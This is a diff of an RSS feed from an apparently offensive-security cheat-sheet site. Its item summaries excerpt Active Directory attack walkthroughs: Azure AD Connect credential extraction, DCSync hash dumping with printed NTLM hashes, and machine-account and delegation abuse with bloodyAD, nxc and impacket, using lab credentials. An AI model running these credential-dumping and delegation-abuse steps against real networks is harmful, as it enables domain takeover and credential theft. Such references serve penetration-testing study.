@@ -6,12 +6,11 @@
     <description>Recent content in Secretsdump on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 21 Feb 2025 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://tldrbins.github.io/@secretsdump/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Azure AD Connect</title>
       <link>https://tldrbins.github.io/azure_ad/</link>
-      <pubDate>Fri, 21 Feb 2025 00:00:00 +0000</pubDate>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/azure_ad/</guid>
       <description>Abuse #1: Azure AD Connect Password Extraction Windows 1. Start ADSync Service Set-Service -name adsync -StartupType automatic Set-Service -name adsync -status running -passthru Set-Service -name adsync -status running -passthru WARNING: Waiting for service &amp;#39;Microsoft Azure AD Sync (adsync)&amp;#39; to start... Status Name DisplayName ------ ---- ----------- Running adsync Microsoft Azure AD Sync 2. Download ADSync.mdf and ADSync_log.LDF python3 adconnectdump.py &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; -hashes :&amp;lt;HASH&amp;gt; $ python3 adconnectdump.py SRV001/Administrator@srv001.example.local -hashes :7ddf32e17a6ac5ce04a8ecbf782ca509 Azure AD Connect remote credential dumper - by @_dirkjan [*] Stopping service ADSync [*] Downloading ADSync database files [*] Starting service ADSync [*] Querying database for configuration data [-] RemoteOperations failed: [Errno 2] No such file or directory: &amp;#39;ADSyncQuery.</description>
     </item>
@@ -23,7 +22,7 @@
       <description>Abuse #1: DCSync Attack Linux Windows # Password impacket-secretsdump -just-dc &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -just-dc &amp;#39;mrlky:Football#7@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: ---[SNIP]--- [*] Cleaning up... # NTLM impacket-secretsdump -hashes :&amp;lt;HASH&amp;gt; -just-dc &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc &amp;#39;sizzle.htb/mrlky@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.</description>
     </item>
     <item>
-      <title>secretsdump</title>
+      <title>Secrets Dump</title>
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
@@ -34,7 +33,7 @@
       <link>https://tldrbins.github.io/seenabledelegationprivilege/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/seenabledelegationprivilege/</guid>
-      <description>Abuse #1: Constrained Delegation Linux Windows 1. Control of a Machine Account bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; $ bloodyAD -d REDELEGATE.VL -u &amp;#39;HELEN.FROST&amp;#39; -p &amp;#39;Fall2024!&amp;#39; --host DC.REDELEGATE.VL set password &amp;#39;FS01$&amp;#39; &amp;#39;Fall2024!&amp;#39; [+] Password changed successfully! 2. Set msDS-AllowedToDelegateTo to Target SPN bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set object &amp;#39;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;msDS-AllowedToDelegateTo&amp;#39; -v &amp;#39;ldap/&amp;lt;DC&amp;gt;&amp;#39; $ bloodyAD -u &amp;#39;HELEN.FROST&amp;#39; -p &amp;#39;Fall2024!&amp;#39; -d &amp;#39;REDELEGATE.</description>
+      <description>Abuse #1: Unconstrained Delegation Linux Windows 1. Check Machine Quota # Password nxc ldap &amp;lt;DC&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq $ nxc ldap DC1.delegate.vl -u &amp;#39;N.Thompson&amp;#39; -p &amp;#39;KALEB_2341&amp;#39; -d delegate.vl -M maq LDAP 10.10.72.178 389 DC1 [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) LDAP 10.10.72.178 389 DC1 [+] delegate.vl\N.Thompson:KALEB_2341 MAQ 10.10.72.178 389 DC1 [*] Getting the MachineAccountQuota MAQ 10.10.72.178 389 DC1 MachineAccountQuota: 10 2. Create a Computer # Password impacket-addcomputer -computer-name &amp;#39;&amp;lt;NEW_COMPUTER&amp;gt;&amp;#39; -computer-pass &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;Test1234&amp;#39; -dc-ip 10.</description>
     </item>
   </channel>
 </rss>
